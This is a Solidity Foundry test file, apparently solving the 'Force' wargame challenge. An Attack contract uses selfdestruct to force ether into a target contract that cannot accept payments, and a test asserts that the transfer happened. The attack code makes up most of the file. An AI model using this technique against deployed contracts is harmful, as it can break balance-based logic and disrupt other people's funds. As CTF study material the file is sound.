// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Force} from "../src/Force.sol";

// attack contract
contract Attack {
    address payable public target;

    constructor(address _target) payable {
        target = payable(_target);
    }

    function attack() external {
        selfdestruct(target);
    }

    receive() external payable {}
}

contract ForceTest is Test {
    Force forceContract;
    Attack attackContract;

    function setUp() public {
        forceContract = new Force();
        attackContract = new Attack(address(forceContract));
    }

    function testSelfdestructSendsMoneytoTheTargetContract() public {
        // Both the balances are 0 initially
        assertEq(address(forceContract).balance, 0);
        assertEq(address(attackContract).balance, 0);

        // Sent some eth to attack contract
        uint256 ethToSend = 2 ether;
        vm.deal(address(attackContract), ethToSend);
        assertEq(address(attackContract).balance, ethToSend);

        // trigger the attack function
        attackContract.attack();

        assertEq(address(forceContract).balance, ethToSend);
        assertEq(address(attackContract).balance, 0);
    }
}

